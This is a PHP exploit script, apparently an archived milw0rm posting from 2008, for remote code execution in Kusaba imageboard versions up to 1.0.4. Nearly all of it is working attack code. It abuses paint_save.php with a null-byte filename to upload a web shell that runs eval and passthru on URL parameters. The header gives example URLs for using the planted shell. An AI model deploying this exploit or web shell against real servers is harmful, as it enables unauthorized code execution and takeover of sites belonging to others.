&lt;?php

/**********************************
9 Oct 2008
Kusaba &lt;= 1.0.4 Remote Code Execution
Sausage &lt;tehsausage@gmail.com&gt;

After execution:
http://www.kusaba.image.board/url/kasubaoek/oekaki.php?pc=print &quot;Hello&quot;;
http://www.kusaba.image.board/url/kasubaoek/oekaki.php?sc=echo Hello
**********************************/

$shellname = &#039;oekaki.php&#039;; // any filename ending in php
$server = &#039;http://www.kusaba.image.board/url/&#039;; // BBS website, with
trailing slash
$image = file_get_contents(&#039;test.jpg&#039;); // image to upload (any valid
picture)
$magicquotes = true;

if ($magicquotes)
{
	$shellcode = &lt;&lt;&lt;endSHELL
&lt;?php
isset(\$_GET[&#039;pc&#039;])?(eval(urldecode(stripslashes(\$_GET[&#039;pc&#039;])))):(isset(\$_GET[&#039;sc&#039;])?(passthru(urldecode(stripslashes(\$_GET[&#039;sc&#039;])))):(header(&#039;Location:
../&#039;)));
endSHELL;
}
else
{
	$shellcode = &lt;&lt;&lt;endSHELL
&lt;?php 
isset(\$_GET[&#039;pc&#039;])?(eval(urldecode(\$_GET[&#039;pc&#039;]))):(isset(\$_GET[&#039;sc&#039;])?(passthru(urldecode(\$_GET[&#039;sc&#039;]))):(header(&#039;Location:
../&#039;)));
endSHELL;
}

$adata = array(
	&#039;No clue&#039; =&gt; &#039;what this is for&#039;,
);

function build_data($adata)
{
	$data = &#039;&#039;;
	foreach ($adata as $k =&gt; $v)
	{
		$data .= &quot;$k=$v;&quot;;
	}
	return substr($data,0,-1);
}

function data_len($data)
{
	return str_pad(strlen($data),8,&#039;0&#039;,STR_PAD_LEFT);
}

$request = new
HttpRequest($server.&#039;paint_save.php?applet=shipainter&amp;saveid=&#039;.$shellname.&#039;%00&#039;,HttpRequest::METH_POST);
$data = build_data($adata);
$imagedata = $image;
$animationdata = $shellcode;
$request-&gt;setRawPostData(&quot;S&quot;.data_len($data).$data.data_len($imagedata).&#039;xx&#039;.$imagedata.data_len($animationdata).$animationdata);

echo $request-&gt;send()-&gt;getBody();

# milw0rm.com [2008-10-09]